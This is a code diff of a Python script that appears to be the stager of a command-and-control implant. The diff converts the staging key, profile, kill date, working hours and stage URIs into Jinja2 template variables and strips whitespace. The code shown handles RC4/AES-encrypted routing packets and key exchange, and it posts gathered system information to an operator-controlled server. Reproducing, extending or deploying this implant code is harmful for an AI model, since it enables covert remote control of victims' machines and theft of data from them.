@@ -1,8 +1,19 @@
 #!/usr/bin/env python
 
+"""
+This file is a Jinja2 template.
+    Variables:
+        working_hours
+        kill_date
+        staging_key
+        profile
+        stage_1
+        stage_2
+"""
+
 # AES code from https://github.com/ricmoo/pyaes
 # DH code from Directly from: https://github.com/lowazo/pyDHE
-#   See README.md for complete citations and sources
+# See README.md for complete citations and sources
 
 import copy
 import sys
@@ -19,7 +30,7 @@ import subprocess
 from binascii import hexlify
 
 
-    
+
 LANGUAGE = {
     'NONE' : 0,
     'POWERSHELL' : 1,
@@ -519,7 +530,7 @@ def CBCenc(aesObj, plaintext, base64=False):
 
     # First we padd the plaintext
     paddedPlaintext = append_PKCS7_padding(plaintext)
-    
+
     # The we break the padded plaintext in 16 byte chunks
     blocks = [paddedPlaintext[0+i:16+i] for i in range(0, len(paddedPlaintext), 16)]
 
@@ -541,7 +552,7 @@ def CBCdec(aesObj, ciphertext, base64=False):
     for block in blocks:
         paddedPlaintext += aesObj.decrypt(block)
 
-    # Finally we strip the padding 
+    # Finally we strip the padding
     plaintext = strip_PKCS7_padding(paddedPlaintext)
 
     return plaintext
@@ -630,11 +641,11 @@ def parse_routing_packet(stagingKey, data):
     Routing packet format:
 
         +---------+-------------------+--------------------------+
-        | RC4 IV  | RC4s(RoutingData) | AESc(client packet data) | ... 
+        | RC4 IV  | RC4s(RoutingData) | AESc(client packet data) | ...
         +---------+-------------------+--------------------------+
         |    4    |         16        |        RC4 length        |
         +---------+-------------------+--------------------------+
-        
+
         RC4s(RoutingData):
         +-----------+------+------+-------+--------+
         | SessionID | Lang | Meta | Extra | Length |
@@ -698,11 +709,11 @@ def build_routing_packet(stagingKey, sessionID, meta=0, additional=0, encData=''
 
         Routing Packet:
         +---------+-------------------+--------------------------+
-        | RC4 IV  | RC4s(RoutingData) | AESc(client packet data) | ... 
+        | RC4 IV  | RC4s(RoutingData) | AESc(client packet data) | ...
         +---------+-------------------+--------------------------+
         |    4    |         16        |        RC4 length        |
         +---------+-------------------+--------------------------+
-        
+
         RC4s(RoutingData):
         +-----------+------+------+-------+--------+
         | SessionID | Lang | Meta | Extra | Length |
@@ -792,10 +803,10 @@ def get_sysinfo(nonce='00000000'):
 sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(8))
 
 # server configuration information
-stagingKey = "REPLACE_STAGING_KEY"
-profile = 'REPLACE_PROFILE'
-WorkingHours = 'SET_WORKINGHOURS'
-KillDate = 'SET_KILLDATE'
+stagingKey = '{{ staging_key }}'
+profile = '{{ profile }}'
+WorkingHours = '{{ working_hours }}'
+KillDate = '{{ kill_date }}'
 
 parts = profile.split('|')
 taskURIs = parts[0].split(',')
@@ -829,7 +840,7 @@ hmacData = aes_encrypt_then_hmac(stagingKey, str(clientPub.publicKey))
 routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=2, encData=hmacData)
 
 try:
-    postURI = server + '/index.jsp'
+    postURI = server + '{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}'
     # response = post_message(postURI, routingPacket+hmacData)
     response = post_message(postURI, routingPacket)
 except:
@@ -845,7 +856,7 @@ clientPub.genKey(serverPub)
 key = clientPub.key
 
 # step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
-postURI = server + '/index.php'
+postURI = server + '{{ stage_2 | default('/index.php', true) | ensureleadingslash}}'
 hmacData = aes_encrypt_then_hmac(clientPub.key, get_sysinfo(nonce=str(int(nonce)+1)))
 
 # RC4 routing packet:
